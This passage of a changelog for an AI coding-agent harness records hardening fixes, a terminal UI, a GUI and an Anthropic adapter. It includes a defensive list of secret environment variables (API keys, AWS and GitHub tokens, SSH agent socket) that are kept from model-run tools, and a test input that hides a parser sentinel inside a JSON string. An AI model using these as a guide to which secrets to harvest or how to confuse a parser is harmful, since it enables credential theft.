- **Integration test `run_broadcasts_message_plan_ledger_and_context_events`** — drives a scripted single-turn run with a `write_file` tool call + the `harness_meta` envelope, captures the bus via `EventSink::Capture`, asserts at least 3 `MessageCommitted` (user/assistant/tool), at least 1 `LedgerAppended`, at least 1 `ContextSnapshot`. Pins the producer contract end-to-end.

Verified: `cargo test --workspace` → **atelier-core 409 + atelier-cli 12 + atelier-gui 10 + atelier-tui 37** (was 409 / 11 / 6 / 31 in v43; +11 new tests: +1 atelier-cli integration, +4 atelier-gui bridge, +6 atelier-tui apply/project, +1 atelier-core dispatcher reordering); `cargo fmt --check` clean; `cargo clippy --workspace --all-targets -- -D warnings` clean; `make check` green.

### Rig counts
- **21 schemas / 52 artifacts / 112 tests / 11 dry-runs / 409 atelier-core unit tests + 12 atelier-cli integration tests + 10 atelier-gui unit tests + 37 atelier-tui unit tests** (was 21 / 52 / 112 / 11 / 409 / 11 / 6 / 31).

## v43 — 2026-05-17

**v25.3 residuals pass + §3 TUI subset multi-pane widgets.** Four remaining residuals from the v25.2 deferred list closed; the TUI shifts from bootstrap-only ("EditStaged counter + event log") to a real four-pane layout matching the §3 TUI subset spec (conversation / plan / diff / cost+context meters) with scrubber-key plumbing. Phase C "§3 TUI subset" mechanical gate is wired at the rendering level — the only missing piece is the producer side (the §2.5 actor doesn't yet broadcast conversation commits / plan applies / ledger ticks; the TUI's `set_conversation` / `set_plan` / `set_cost_usd` / `set_context_tokens` mutators are the seam the producer side will plug into).

**Residuals fixed (v25.3-A through D):**

- **`crates/atelier-core/src/subprocess.rs`** — reader-task awaits now bounded by `tokio::time::timeout(POST_KILL_REAP_TIMEOUT)`. A leaked descendant outside the pgid that keeps a pipe open can no longer hang the runtime forever — partial output is discarded on elapse and a `tracing::warn!` carries the program/pid for diagnosis.
- **`crates/atelier-core/src/adapter/anthropic.rs`** — `extract_overflow_numbers` rewritten with two anchored regexes (`\b(\d+)\s+tokens\b\s*>\s*(\d+)` and a fallback `\b(\d+)\s+tokens\b`). A future error format that embeds a request_id or timestamp before the token counts can no longer misreport via positional scan. `message_delta` `output_tokens` now always overwrites (was: gated on `> 0`) — Anthropic emits the value monotonically and the last delta is authoritative.
- **`crates/atelier-core/src/staging.rs`** — staging tempdir is `fsync_dir_best_effort`'d before the rename phase. The staged files were already content-fsync'd via `write_with_sync`, but the *staging-tree dirents* were still in the cache — a crash between staging completion and a successful rename could surface as ENOENT mid-batch.
- **`crates/atelier-core/src/persistence.rs`** — two new regression tests (`save_to_re_tightens_relaxed_session_dir`, `registry_save_re_tightens_relaxed_parent_dir`) explicitly cover the chmod-relaxed → save → re-tightened path. Pre-fix the existing tests only checked fresh dirs, which would be 0700 from umask on CI anyway.

**§3 TUI subset multi-pane (v25.3 TUI-1 through TUI-5):**

- **`crates/atelier-tui/src/lib.rs`** — `AppState` extended with `conversation` (bounded `VecDeque<ConversationLine>`), `recent_edits` (bounded `VecDeque<StagedEdit>`), `plan: PlanCanvas`, `total_cost_usd`, `context_tokens: (u32, u32)` (known + unknown), `context_window_tokens` (defaulted to 200k), and `scrub_offset`. New types: `ConversationLine`, `ConversationRole { User, Assistant, Tool, System }` with stable colour mapping, `StagedEdit`, `ScrubCommand { Prev, Next, JumpToHead }`. `InputOutcome` gains `Scrub(ScrubCommand)`.
- **Conversation pane** — role-prefixed list, tail-rendered (newest pinned at bottom), with empty-state placeholder.
- **Diff pane** — renders the most recent `EditStaged` via `Hunks` variants: `Lines` produces `@@ -old,len +new,len @@` headers with `-`/`+` markers; `Created` / `Deleted` show line+byte-count badges; `Binary` and `Same` show their badges. Truncates to the available rows.
- **Plan canvas pane** — per-step glyphs (`[ ]` pending, `[▸]` in-progress, `[✓]` done, `[~]` skipped); terminal-status steps render strike-through; constraints render indented under their step.
- **Cost + context meters** — cost as `$0.XXXX` (no upper bound; meter would be misleading); context as a ratatui `Gauge` with the known/window ratio, plus an explicit `+N unknown` suffix when items have `TokenSource::Unavailable` so a silently-underreporting meter is visible (spec §5 contract).
- **Scrubber-key plumbing** — `[` emits `ScrubCommand::Prev`, `]` emits `Next`, `g` emits `JumpToHead`. `apply_scrub` walks an `Option<usize>` offset (None = HEAD), with `Next` from `Some(1)` collapsing back to HEAD. Header renders `scrub=HEAD` or `scrub=-N`; help footer documents the keys + adds a pinned-mode hint. The §4 time-travel subsystem will consume the offset; until then the TUI just records intent.
- **Layout** — header (2 rows) / top row split conversation+plan (60/40) / bottom row split diff and a vertical strip of cost-gauge + context-gauge + event-log tail (60/40) / 1-row help footer. The existing event-log widget moves into the bottom-right vertical strip; the bus-driven counters still go in the header.

Verified: `cargo test --workspace` → **atelier-core 409 + atelier-cli 11 + atelier-gui 6 + atelier-tui 31** (was 407 / 11 / 6 / 10 in v42; +23 new tests: +2 atelier-core regression on 0700 re-tightening, +21 atelier-tui on the new panes and scrubber); `cargo fmt --check` clean; `cargo clippy --workspace --all-targets -- -D warnings` clean; `make check` green.

### Rig counts
- **21 schemas / 52 artifacts / 112 tests / 11 dry-runs / 409 atelier-core unit tests + 11 atelier-cli integration tests + 6 atelier-gui unit tests + 31 atelier-tui unit tests** (was 21 / 52 / 112 / 11 / 407 / 11 / 6 / 10).

## v42 — 2026-05-16

**Deep-scan v25.2 — residuals pass.** A second pass over the v25.1 re-scan findings. Six load-bearing residuals fixed; the rest documented as deferred quality-of-life items.

- **`crates/atelier-core/src/protocol_strategy.rs`** — v25.2-A. `parse_json_sentinel` now scans past the JSON value via `serde_json::StreamDeserializer::byte_offset()` instead of `find(SENTINEL_CLOSE)`. An embedded `<<<end>>>` (or `<<<harness_meta>>>`) inside a JSON string literal no longer truncates the parse — pre-fix a model emitting `{"summary":"see <<<end>>> tag"}` would surface as `Envelope::Parse` and be miscategorised in the conformance ring. New `TrailingContentAfterSentinel { length, prefix }` variant carries up to 64 bytes of trailing content (UTF-8 char-boundary safe) for triage. Two new regression tests: embedded close-tag and embedded open-tag in summary strings.
- **`crates/atelier-core/src/adapter/anthropic.rs`** — v25.2-B. `parse_retry_after_ms` floors at `MIN_RATE_LIMIT_BACKOFF_MS = 100` so a confused proxy emitting `Retry-After: 0` no longer lets the harness hot-loop the API. SSE EOF now flushes a partial event whose `data:` line lacks a terminating blank line (non-spec server protection) — `take_line(at_eof=true)` consumes the remaining bytes as a final line, and `drain_buffer(at_eof=true)` dispatches the buffered event before reporting "stream ended without message_stop". `handle_event` Malformed-event handling documented (does NOT push a partial Complete first, because the default `chat()` would silently rubber-stamp the malformed turn). New regression test for `Retry-After: 0`.
- **`crates/atelier-core/src/init.rs`** — v25.2-C. `atomic_write` now `fsync_dir_best_effort`s the parent after `persist()` so a power loss between rename and natural dirent fsync can't roll ATELIER.md or `.gitignore` back to pre-write state. Same pattern staging.rs and persistence.rs already use.
- **`crates/atelier-core/src/persistence.rs`** — v25.2-D. `restrict_dir_mode` now emits a `tracing::warn!` on `set_permissions` failure (with the dir's current mode for context) so the spec §14 "0700" promise can't be silently violated on shared hosts. Also warns when stat itself fails.
- **`crates/atelier-core/src/protocol_conformance.rs`** — v25.2-E. `ConformanceSnapshot::rate()` now `#[must_use]` so a stray `unwrap_or(1.0)` after a refactor is at least linted. Empty-buffer test renamed from `empty_buffer_has_perfect_rate_so_new_adapters_dont_fail_a_threshold_check` (stale, contradicted the post-P4 assertion) to `empty_buffer_reports_no_evidence_not_perfect_rate`.
- **`crates/atelier-cli/src/runner.rs`** — v25.2-F. Tool-error feedback path uses `serde_json::json!({ "error": e.to_string() }).to_string()` instead of the unescaped `format!` — error messages containing quotes, backslashes, or newlines now produce valid JSON the model can parse. Assistant turn's `tool_calls` now retains the `harness_meta` envelope-bearing call (filtering moved to a separate `real_tool_calls` view) so the envelope tool_use id survives in conversation history; only dispatch filters it out, not history. New integration test exercising the failing-tool path with characters that need escaping.

Verified: `cargo test --workspace` → **atelier-core 407 + atelier-cli 11 + atelier-gui 6 + atelier-tui 10** (was 404 / 10 / 6 / 10 in v41; +8 new regression tests across A/B/F); `cargo fmt --check` clean; `cargo clippy --workspace --all-targets -- -D warnings` clean; `make check` green.

### Rig counts
- **21 schemas / 52 artifacts / 112 tests / 11 dry-runs / 407 atelier-core unit tests + 11 atelier-cli integration tests + 6 atelier-gui unit tests + 10 atelier-tui unit tests** (was 21 / 52 / 112 / 11 / 404 / 10 / 6 / 10).

## v41 — 2026-05-16

**Deep-scan v25 — five priority groups fixed.** A fresh 6-subsystem audit produced ~230 findings; the highest-priority groups (subprocess hardening, SSE parser correctness, atomicity, fail-open paths, BYOM trait shape) landed in one pass with full rig + workspace verification green.

- **`crates/atelier-core/src/subprocess.rs`** — P1. Env scrubbing: `env_clear()` + explicit `ENV_PASSTHROUGH` allowlist (PATH, HOME, USER, LOGNAME, LANG, LC_*, TERM, TZ, TMPDIR, SHELL). `ANTHROPIC_API_KEY`, `AWS_*`, `GITHUB_TOKEN`, `SSH_AUTH_SOCK` no longer leak into model-controlled tool invocations. Child put in its own process group via tokio's `Command::process_group(0)` on Unix; on timeout we `libc::kill(-pgid, SIGKILL)` so grandchildren (`sh -c "long | pipe"`) are reaped, not orphaned. Per-pipe byte cap (default 1 MiB) with `stdout_truncated`/`stderr_truncated` flags. New `read_capped` helper. Tests cover env strip, PATH passthrough, byte cap truncation, killpg-reaches-grandchildren.
- **`crates/atelier-core/src/adapter/anthropic.rs`** — P2 + P5. **P2:** rewrote `AnthropicSseSource` as a proper line-buffered state machine. `take_line` finds first `\r`/`\n`, handles `\r\n`/`\n`/lone `\r`, waits if buffer ends mid-CRLF. UTF-8 decoding happens only on the assembled event payload — multi-byte codepoints split across TCP chunks no longer corrupt. Bounded buffer (8 MiB) prevents OOM on missing terminators. `message_delta.delta.stop_reason` parsed and propagated; non-stream path too. `Retry-After` header parsed (seconds, 300s cap) replacing hardcoded 1s. `extract_overflow_numbers` lifts `needed`/`limit` out of the body. `too_long` substring tightened to three specific Anthropic markers. **P5:** assistant turn re-sent with `tool_use` content blocks (text + tool_use array) instead of flattened text-only — preserves `tool_use_id` for matching `tool_result` blocks. New tests: chunk-boundary split, one-byte-per-chunk stream, CRLF line terminators, 4-byte emoji split mid-codepoint, stop_reason propagation, Retry-After parsing + 300s cap, overflow token extraction, double-envelope rejection, assistant tool_calls round-trip.
- **`crates/atelier-core/src/adapter/mod.rs`** — `StopReason` enum (`EndTurn`/`MaxTokens`/`ToolUse`/`StopSequence`/`Refusal`/`Other`). `ChatResponse.stop_reason: Option<StopReason>`. `Message.tool_calls: Vec<ToolCallRequest>` + `Message::text(role, content)` constructor.
- **`crates/atelier-core/src/staging.rs`** — P3. Staged file writes use new `write_with_sync` (create → write → `sync_all` → close); rename loop collects unique parents into `BTreeSet` and `fsync_dir_best_effort`s each after the batch. A power-loss between rename N and rename N+1 no longer rolls the workspace back to its pre-batch state.
- **`crates/atelier-core/src/persistence.rs`** — P3. `restrict_dir_mode` helper tightens `sessions/` and `~/.atelier/` directories to 0700 on Unix. Regression tests for both.
- **`crates/atelier-core/src/init.rs`** — P3. `atomic_write` (tempfile + persist) replaces bare `fs::write` for ATELIER.md; `atomic_append_atelier_entry` does read-modify-write through the same helper for `.gitignore`. Crash mid-write can no longer leave a truncated remnant that the next `init` silently skips. Regression test asserts no leftover `.tmpXXX` after init.
- **`crates/atelier-core/src/protocol_conformance.rs`** — P4. `ConformanceSnapshot::rate()` returns `Option<f32>` — empty buffer is `None` ("no evidence"), no silent 1.0 rubber-stamp. Added `has_evidence()` predicate.
- **`crates/atelier-core/src/protocol_strategy.rs`** — P4. `parse_json_sentinel` errors with new `StrategyError::TrailingContentAfterSentinel` on any non-whitespace after the close tag. Catches the double-envelope drop the audit named. Trailing whitespace (newlines from the wire) is still fine.
- **`crates/atelier-core/src/dod.rs`** — P4. `DodConfig::load` doc-warns callers against treating `Ok(None)` as "verification passed". New `paths_searched(repo_root)` helper so callers can log where discovery looked.
- **`crates/atelier-cli/src/runner.rs`** — P4 + P5. `dod_passed = Some(true)` placeholder removed — now `None` until a real DoD runner lands (was lying to downstream readers). Assistant turn pushed with `tool_calls` so multi-turn tool flows preserve the original ids end-to-end.
- **`crates/atelier-core/src/tools/shell.rs`** — surfaces `stdout_truncated`/`stderr_truncated` in the tool's JSON output.
- **`Cargo.toml` + `crates/atelier-core/Cargo.toml`** — `libc = "0.2"` workspace dep, target-gated to `cfg(unix)` in atelier-core.

Verified: `cargo test --workspace` → **atelier-core 404 + atelier-cli 10 + atelier-gui 6 + atelier-tui 10** (was 379 / 10 / 6 / 10; +25 new regression tests across P1–P5); `cargo fmt --check` clean; `cargo clippy --workspace --all-targets -- -D warnings` clean; `make check` green (21 schemas / 52 artifacts / 112 rig tests / 11 dry-runs).

### Rig counts
- **21 schemas / 52 artifacts / 112 tests / 11 dry-runs / 404 atelier-core unit tests + 10 atelier-cli integration tests + 6 atelier-gui unit tests + 10 atelier-tui unit tests** (was 21 / 52 / 112 / 11 / 379 / 10 / 6 / 10).

## v40 — 2026-05-16
**Phase C unblock (4) — TUI bootstrap lands.** `crates/atelier-tui` is no longer a scaffold. `cargo run -p atelier-tui` opens a ratatui + crossterm shell that subscribes to the same `atelier-core` broadcast bus the GUI does, renders an event log + an `EditStaged` counter live, and quits cleanly on `q` / `Esc` / `Ctrl-C`. Closes the §3 TUI subset snapshot gate at the wiring level; the richer widgets (conversation, diff, file tree, plan canvas, cost + context meters, timeline scrubber) sit on top.

- **`crates/atelier-tui/Cargo.toml`** — uncommented `ratatui`, `crossterm`, `tokio`, `tracing(-subscriber)` deps; added `tokio-stream`; added `[lib]` so tests can call `render` / `apply` / `handle_key` / `project_event` without booting a terminal.
- **`crates/atelier-tui/src/lib.rs`** — new. Three-zone layout (header / event log / help footer) drawn from an `AppState` that an `apply(&Event)` mutator updates as events arrive on the broadcast bus. Newest events first (no scroll), bounded `MAX_EVENT_LOG = 1_000` so a long-running session can't OOM. Header shows the most recent transition's `to` state + cumulative `EditStaged` count. `handle_key` dispatches `q` / `Esc` / `Ctrl-C` → `InputOutcome::Quit`. `run()` boots a `tokio` multi-thread runtime, enables raw mode + alternate screen, installs a `TerminalGuard` RAII restorer (panic-safe), and runs a `tokio::select!` over the broadcast and a `spawn_blocking` `crossterm::event::poll(50ms)`. Lag-handling: `RecvError::Lagged(_)` synthesises a visible `Lagged` line in the log so a slow-to-redraw TUI doesn't silently lose events.
- **`crates/atelier-tui/src/main.rs`** — three lines. Returns `ExitCode::from(1)` on `io::Error` so terminal-setup failures surface in `$?`.
- **10 unit tests** cover the pure surface: `apply` increments / state-tracking / log-bound, `project_event` for all five `Event` variants, `render` for header content (state + counter), the empty-state placeholder, newest-first ordering in the log, the help footer mentioning `quit`, and `handle_key` quitting on q / Esc / Ctrl-C while continuing on other keys. Tests render onto a `Buffer::empty(Rect)` directly — no PTY needed.
- **`crates/atelier-tui/README.md`** — rewritten. Current state, quick start (`cargo run -p atelier-tui`, `cargo test -p atelier-tui`), ASCII architecture diagram of the pure-vs-impure split, anti-bootstrap retained + extended (don't read off the broadcast inside the render path; don't add Cancel until the typed-command direction is wired the same way `atelier-gui` will need).

Lockfile pins required to stay on rustc 1.85 (ratatui's `instability` proc-macro and its `darling` dep moved their MSRV recently): `instability` 0.3.7. (`darling` was already pinned 0.20.11 in v39 for the GUI; the same pin covers the TUI.)

Verified: `cargo test --workspace` → **atelier-core 379 + atelier-cli 10 + atelier-gui 6 + atelier-tui 10**; `cargo fmt --check` clean; `cargo clippy --workspace --all-targets -- -D warnings` clean; `make check` end-to-end green. Did **not** drive `cargo run -p atelier-tui` interactively — the terminal loop is best verified by a human (alt-screen + raw mode are visual).

Phase C unblockers complete:
- [x] (1) `atelier run` CLI subcommand (v37)
- [x] (2) §1 Anthropic adapter (v38)
- [x] (3) Tauri GUI bootstrap (v39)
- [x] (4) TUI widgets (this entry)

### Rig counts
- **21 schemas / 52 artifacts / 112 tests / 11 dry-runs / 379 atelier-core unit tests + 10 atelier-cli integration tests + 6 atelier-gui unit tests + 10 atelier-tui unit tests** (was 21 / 52 / 112 / 11 / 379 / 10 / 6 / 0).

## v39 — 2026-05-16
**Phase C unblock (3) — Tauri GUI bootstrap lands.** `crates/atelier-gui` is no longer a scaffold. The Rust shell + Svelte panel + IPC bridge are wired; `cargo build -p atelier-gui`, `cargo tauri info`, `npm run check`, and `npm run build` all pass. The first panel subscribes to the atelier-core broadcast bus and counts `EditStaged` events — the smallest end-to-end demonstration that the spec §3 wiring round-trips.

D1–D4 decisions captured: `dev.atelier.app` (placeholder bundle id), `Atelier` (product/window title), TypeScript + Vite + Svelte 5, `http://localhost:1420` (Vite pinned with `strictPort: true`).

- **`crates/atelier-gui/Cargo.toml`** — uncommented `tauri`, `tokio`, `tracing(-subscriber)`, `serde(_json)`, `tokio-stream`, `tauri-build`. Added `[lib]` so integration tests can pull in `bridge_event` without going through the binary.
- **`crates/atelier-gui/src/lib.rs`** — new. `run()` boots Tauri, spawns `atelier_core::session::Handle` with `NoopHook`s, and starts a tokio task that pumps the broadcast `Event` stream onto Tauri's event bus as `atelier://event`. Manual `bridge_event` function projects each `Event` variant onto a `{kind, payload}` JSON shape — pure function, 6 unit tests cover the five variants + serialization round-trip. Chose to hand-roll the projection rather than add `Serialize` to `atelier_core::session::Event` so the core enum's serialization surface stays intentional. Single `ping` IPC command lets the eventual integration test confirm round-trip without booting a full session.
- **`crates/atelier-gui/src/main.rs`** — three lines. Calls `atelier_gui::run()` from the `[lib]` crate. `#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]` to suppress the stray console on Windows release builds.
- **`crates/atelier-gui/build.rs`** — three lines. `tauri_build::build()`.
- **`crates/atelier-gui/tauri.conf.json`** — schema-pinned config; single `main` window 1200×800, narrow CSP (`default-src 'self'`), `frontendDist: "../ui/dist"`, `devUrl: "http://localhost:1420"`. Bundle targets `all` with one placeholder PNG icon.
- **`crates/atelier-gui/capabilities/default.json`** — deliberately narrow: only `core:default` + `core:event:default`. No fs/shell/http — webview must go through the Rust shell, which goes through the §15 dispatcher.
- **`crates/atelier-gui/icons/icon.png`** — 32×32 transparent placeholder, generated via a Python one-liner (zlib + struct, ~80 bytes). Replace with `cargo tauri icon` before the first signed release.
- **`crates/atelier-gui/ui/`** — Vite + Svelte 5 + TypeScript scaffold from `npm create vite@latest`. `App.svelte` subscribes via `@tauri-apps/api/event#listen` and renders an event log + `EditStaged` counter. `vite.config.ts` pinned to `port: 1420, strictPort: true` so Vite can't silently roll to 1421 and 404 the webview. Demo Counter / hero / Svelte+Vite logo assets deleted; `src/app.css` reduced to a comment so component-scoped styles in `App.svelte` own the cascade.
- **`crates/atelier-gui/README.md`** — rewritten from a planning doc to a state-of-the-bootstrap doc. Captures the D1–D4 decisions and where they live in the generated files, the quick-start commands, and an ASCII architecture diagram of the broadcast bridge. Anti-bootstrap retained + extended.
- **`.gitignore`** — added `crates/atelier-gui/ui/{node_modules,dist,.svelte-kit}/`.

Lockfile pins required to stay on rustc 1.85 (Tauri's transitive deps moved their MSRV to 1.86/1.88 in recent releases): `darling` 0.20.11, `serde_with`/`serde_with_macros` 3.14.0, `time` 0.3.41 (pulls `time-core` 0.1.4 + `time-macros` 0.2.22 + `deranged` 0.4.0 + `num-conv` 0.1.0), `plist` 1.8.0, `quick-xml` 0.38.4. `tauri-cli` installed via `cargo install tauri-cli --version "^2.0" --locked`.

Verified: `cargo test --workspace` → **atelier-core 379 + atelier-cli 10 + atelier-gui 6**; `cargo fmt --check` clean; `cargo clippy --workspace --all-targets -- -D warnings` clean; `make check` end-to-end green; `npm --prefix crates/atelier-gui/ui run check` clean; `npm --prefix crates/atelier-gui/ui run build` produces `dist/`. Did **not** drive `cargo tauri dev` (opens an interactive webview window — best verified by a human).

Phase C unblockers status:
- [x] (1) `atelier run` CLI subcommand (v37)
- [x] (2) §1 Anthropic adapter (v38)
- [x] (3) Tauri GUI bootstrap (this entry)
- [ ] (4) TUI widgets — last one

### Rig counts
- **21 schemas / 52 artifacts / 112 tests / 11 dry-runs / 379 atelier-core unit tests + 10 atelier-cli integration tests + 6 atelier-gui unit tests** (was 21 / 52 / 112 / 11 / 379 / 10 / 0).

## v38 — 2026-05-16
**Phase C unblock (2) — §1 Anthropic adapter lands.** First real BYOM provider plugged into the `atelier run` loop. Concrete `Adapter` impl talks to `POST https://api.anthropic.com/v1/messages` (`anthropic-version: 2023-06-01`) for both non-streaming `chat()` and streaming `stream()`. Native tool use translates Anthropic's `tool_use` content blocks into `ToolCallRequest`s so the §2 envelope can ride as the `harness_meta` tool's arguments — exactly as Phase B's `Strategy::NativeTool` requires.

- **`crates/atelier-core/src/adapter/anthropic.rs`** — new `AnthropicAdapter`. `new(api_key, model_id)` for explicit credentials; `with_base_url(url)` for tests; `from_env(model_id)` reads `ANTHROPIC_API_KEY`. `Debug` redacts the key.
  - `chat()` — non-streaming POST; parses `content` blocks (`text` + `tool_use`); returns `ChatResponse` with `strategy = NativeTool` iff any tool_use was emitted.
  - `stream()` — POST with `stream: true`; the new `AnthropicSseSource` (private `ChunkSource` impl) parses SSE events (`message_start`, `content_block_*`, `message_delta`, `message_stop`, `error`) into `StreamChunk` values incrementally. Tool-call arguments accumulate across `input_json_delta` events; `content_block_stop` flushes a fully-parsed `ToolCallCompleted`.
  - HTTP error mapping: `401/403` → `Auth`, `429` → `RateLimited`, `5xx` → `Provider`, `400` containing `too_long` → `ContextOverflow`, malformed body → `Malformed`. Truncated streams emit a final `Error` chunk so the loop terminates rather than hanging.
  - `count_tokens()` returns the spec §1 `char/4` fallback with `TokenSource::Approx`; wiring the real `/v1/messages/count_tokens` endpoint is deferred (separate session — needs its own error shape and rate-limit handling). `prompt_cache` and `vision` declared `Unsupported` until those land.
  - **18 unit tests against `wiremock`** covering happy-path chat + tool-use, all error mappings, SSE text-only response, SSE native tool use across multiple `input_json_delta` chunks, SSE truncation, SSE provider `error` event, request shaping (system message split, tool spec forwarding, tool-result block mapping), `from_env`, model-id round-trip, capability defaults. **No live API calls in CI.**
- **`crates/atelier-core/src/adapter/`** — `adapter.rs` restructured to `adapter/mod.rs` so concrete adapters can live as siblings (`adapter/anthropic.rs` first; `openai_compat`, `ollama`, `bedrock`, `vertex` later). `ChunkSource` made `pub(crate)` + `ChunkStream::from_inner` constructor added for sibling-module use. Public API surface unchanged for existing consumers.
- **`crates/atelier-cli/src/runner.rs`** — `ProviderChoice::Anthropic { model_id }` variant added. `Runner::new` becomes fallible (`Result<Self, RunError>`) because Anthropic needs credentials at construction time; `Config` for missing env vars, `Adapter` for everything else.
- **`crates/atelier-cli/src/main.rs`** — `--provider anthropic` accepted. New `--model <id>` flag (defaults to `anthropic:claude-opus-4-7` for the anthropic provider, rejects ids that aren't prefixed `anthropic:`). Unknown providers now error with the supported set listed.
- **`crates/atelier-cli/tests/run_integration.rs`** — 2 new binary tests: `--provider anthropic` without `ANTHROPIC_API_KEY` errors with the env-var name; `--provider anthropic --model claude-opus-4-7` (missing prefix) errors usefully.

Workspace deps added: `wiremock = "0.6"` (dev), `bytes = "1"`. atelier-core gains `reqwest` + `bytes` deps and `wiremock` dev-dep. Lockfile pins: `idna_adapter` 1.2.1, `icu_locale_core/properties/properties_data/normalizer/normalizer_data/provider/collections` ≤ 2.1.1 (the latest 2.2.0 line requires rustc 1.86; we stay on 1.85).

Verified: `cargo test --workspace` → **atelier-core 379 + atelier-cli 10 integration**; `cargo fmt --check` clean; `cargo clippy --workspace --all-targets -- -D warnings` clean; `make check` end-to-end green.

Phase C unblockers status:
- [x] (1) `atelier run` CLI subcommand (v37)
- [x] (2) §1 Anthropic adapter (this entry)
- [ ] (3) Tauri GUI bootstrap — needs interactive D1–D4
- [ ] (4) TUI widgets — parallel to (3)

`atelier run --provider anthropic --model anthropic:claude-opus-4-7 "..."` is now meaningful end-to-end against a live API; the integration tests stay on the mock so CI never touches the network.

### Rig counts
- **21 schemas / 52 artifacts / 112 tests / 11 dry-runs / 379 atelier-core unit tests + 10 atelier-cli integration tests** (was 21 / 52 / 112 / 11 / 361 / 8).

## v37 — 2026-05-16
**Phase C unblock (1) — `atelier run` CLI subcommand lands.** First end-to-end driver of the agent loop. Wires the §2.5 actor + §15 dispatcher + 7 built-in tools + §15 hooks + §7 DoD + §11 sandbox + §1 typed ledger against the in-tree `MockAdapter`. The §3 mechanical gate (scripted multi-file rename, byte-equal final diff) is now runnable in CI against the mock; the same code runs against any future adapter (Anthropic next) without changes.

- **`crates/atelier-cli/src/runner.rs`** — new `Runner` API with `Runner::new(workspace, provider, sink)` + `with_max_turns(n)` + `run(prompt)`. Loop: load `HookSet` + `DodConfig` → build `Dispatcher` with all 7 built-in tools + `ShellHookExecutor` → spawn `Session` actor → loop turns (`adapter.chat` → parse envelope via `protocol_strategy` → dispatch tool calls via `SessionDispatcher` → feed results back into messages) until `claimed_done: true` or `max_turns`. Transition to `Verifying` for DoD checks, persist via `OnDiskSession::save_to` to `<repo>/.atelier/sessions/<uuid>/session.json`. `EventSink::{Stdout, Capture, Null}` for binary vs. tests vs. silence.
- **`crates/atelier-cli/src/main.rs`** — `atelier run [OPTIONS] [PROMPT]` subcommand. Flags: `--provider mock` (only `mock` for v0; `anthropic` lands with unblock 2), `--workspace PATH`, `--max-turns N`, `--prompt-file PATH` (or `-` for stdin). Prints session id + final state + DoD outcome on success; surface a useful error pointing at Phase C unblock (2) when an unsupported provider is named.
- **`crates/atelier-cli/tests/run_integration.rs`** — 8 integration tests:
  - loops until `claimed_done` and reaches `State::Done`
  - dispatches real `write_file` tool calls and loops back into the next turn
  - bails after `max_turns` without `claimed_done` (no infinite loop)
  - **scripted multi-file rename — the §3 mechanical gate against MockAdapter** (3 files; the spec's gate scales to 10 with the same shape)
  - persists session.json under `.atelier/sessions/<uuid>/`
  - `assert_cmd`-driven binary tests: `--help` lists `run` + `--provider`, unknown provider errors helpfully, empty prompt rejected
- **Drop-order fix uncovered by the integration tests:** `SessionDispatcher` holds a `broadcast::Sender` clone; without dropping it before awaiting the event-drain task, the runner hung waiting for a channel that couldn't close. The runner now drops `session_dispatcher` then `session_handle` before awaiting, with a safety `tokio::time::timeout` wrapping the await so a future regression can't hang the process.

Workspace deps added: `assert_cmd = "2"`, `predicates = "3"`. atelier-cli gains `tokio` (full), `serde_json`, `parking_lot`, `tracing`, `thiserror`.

Verified: `cargo test --workspace` → **atelier-core 361 + atelier-cli 8 integration**; `cargo fmt --check` clean; `cargo clippy --workspace --all-targets -- -D warnings` clean; `make check` end-to-end green.

Phase C unblockers status:
- [x] (1) `atelier run` CLI subcommand
- [ ] (2) §1 Anthropic adapter — next session
- [ ] (3) Tauri GUI bootstrap — needs interactive D1–D4
- [ ] (4) TUI widgets — parallel to (3)

### Rig counts
- **21 schemas / 52 artifacts / 112 tests / 11 dry-runs / 361 atelier-core unit tests + 8 atelier-cli integration tests** (was 21 / 52 / 112 / 11 / 361 / 0).

## v36 — 2026-05-16
**Spec edits to clear the path for multi-provider / multi-model routing.** No new code — three small structural changes so the user's eventual Bedrock + Vertex + Ollama / llama.cpp / MLX-LM adapters land cleanly into the existing phase plan instead of forcing schema bumps or auth-layer surgery later.

- **Free-form roles in `schemas/config/routing.v1.json`.** `executor` stays required (catch-all loop runner and fallback for any role-less plan step). `planner` and `critic` stay as well-known optional roles with their specific UI semantics. **Any additional key is now a free-form custom role** — `documenter`, `web_trawler`, `architect`, `reviewer`, anything the user wants — mapped to a `<provider>:<model>` ref or null. The dispatcher (Phase E work) will route a turn to a custom role when a `PlanStep` carries a matching role tag. `additionalProperties` swapped from `false` to a `model_ref`-or-null shape; description updated; spec §1 "Per-task routing" rewritten to spell out the loose-vs-strict-roles choice (now loose).
- **`examples/config/routing_multimodel.v1.json`** — new bundled example that demonstrates the user's scenario verbatim: cloud frontier for `architect` / `reviewer`, local Ollama for `documenter` / `web_trawler`. Validated by the rig (21/21 schemas, 52/52 artifacts).
- **Spec §11 "Credentials abstraction"** — new subsection introducing the `CredentialsProvider` trait + `CredentialShape::{ApiKey, AwsSigV4, GcpAdc, Local}`. The existing keychain/env flow is the `ApiKey` impl; SigV4 (Bedrock) and ADC (Vertex) gain dedicated shapes so adapters declare *how* they authenticate without each adapter reimplementing the resolution chain. CLI surface extends with `atelier login bedrock` / `atelier login vertex` / `atelier login ollama`. Audit (§12) records the resolved shape, never the secret.
- **Spec §"Phased build plan"** — Phase E gains native Bedrock + Vertex adapters + per-task routing UI as named items (calibrated against Phase B–D ledger data; LiteLLM proxy from Phase A covers them day-one). Phase F's "OpenAI and local adapters; per-task routing" line replaced with per-adapter named items (Ollama / llama.cpp / MLX-LM) plus the explicit note that the LiteLLM proxy already handles them transparently.
- **`tasks/todo.md`** — Phase E gets a new "Native cloud adapters + per-task routing UI" subsection (4 items + 2 prereqs: `CredentialsProvider` trait + CLI extension). Phase F's adapter list breaks out into per-provider items.

Why this is structural-only: the user asked where to land Bedrock / Vertex / local LLMs / multi-model routing. Today the spec's `routing.v1.json` fixes 3 roles, which doesn't map to the user's task-affinity model. Today §11 covers API-key auth only. Fixing both now (small spec + schema edits) lets the eventual adapter work in Phase E / Phase F slot in without forcing a routing v2 or §11 rewrite mid-build.

Verified: `make check` green — 21/21 schemas, **52/52 artifacts** (was 51; +1 for `routing_multimodel.v1.json`), 112 rig tests, 11/11 canonical dry-runs. **Rust unchanged** (no atelier-core code touched this rev).

### Rig counts
- **21 schemas / 52 artifacts / 112 tests / 11 dry-runs / 361 Rust unit tests** (was 21 / 51 / 112 / 11 / 361).

## v35 — 2026-05-16
**All remaining v34-analysis items closed.** Four medium-severity fixes (one regression of a v34 partial fix + three new) and seven low-severity cleanups. The deep analysis run after v34 surfaced these; this rev clears the list.

